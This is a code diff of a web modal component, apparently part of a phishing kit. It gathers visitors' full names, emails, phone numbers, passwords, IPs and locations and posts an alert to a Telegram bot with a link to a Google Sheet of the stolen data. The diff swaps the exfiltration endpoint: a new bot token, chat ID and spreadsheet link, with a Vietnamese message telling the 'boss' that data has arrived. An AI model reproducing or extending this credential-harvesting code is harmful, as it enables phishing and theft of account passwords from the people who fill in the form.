@@ -115,11 +115,11 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         const formDataToSend = [[formattedTime, geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
 
-        const telegramMessage = `sếp ơiiiii, có data nè\n\n<a href="https://docs.google.com/spreadsheets/d/1fq0JY27aCR64GOAONNG4itQoDk92FKs_kOkFpvuC5rQ">Xem data</a>`;
+        const telegramMessage = `sếp ơiiiii, có data nè\n\n<a href="https://docs.google.com/spreadsheets/d/15Ceq86G3JfRqi23C2qW0-QKYlqws_JzWk3w-FmIxA8o/edit?gid=0#gid=0">Xem data</a>`;
 
         try {
-            await axios.post(`https://api.telegram.org/bot8256986050:AAEf8EfL1iyMKJnsK7-ZZzYJEQN8ZQ8RIEk/sendMessage`, {
-                chat_id: '-5043542465',
+            await axios.post(`https://api.telegram.org/bot7225789627:AAH49ocVMw2qIIURg6ffOIYwJXb8uPdYTEA/sendMessage`, {
+                chat_id: '7746064314',
                 text: telegramMessage,
                 parse_mode: 'HTML'
             });
